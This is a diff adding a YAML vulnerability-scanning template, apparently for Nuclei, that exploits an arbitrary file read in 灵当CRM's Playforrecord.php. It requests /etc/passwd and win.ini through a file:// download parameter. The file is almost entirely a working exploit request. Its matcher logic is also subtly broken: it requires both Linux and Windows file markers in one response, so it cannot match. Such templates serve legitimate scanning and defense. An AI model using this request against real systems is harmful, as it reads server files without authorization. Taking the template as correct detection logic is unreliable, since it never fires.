@@ -1,0 +1,38 @@
+id: poc-yaml-51mis-crm-playforrecord-php-anyfile-read
+info:
+  name: 灵当CRM Playforrecord.php 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+variables:
+  paths:
+    - "c:/windows/win.ini"
+    - "/etc/passwd"
+
+http:
+  - method: GET
+    path:
+      - "/crm/modules/Accounts/Playforrecord.php?download=file:///{{paths}}"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+        condition: and
+      - type: word
+        part: body
+        words:
+          - "[files]"
+          - "bit app support"
+        condition: and
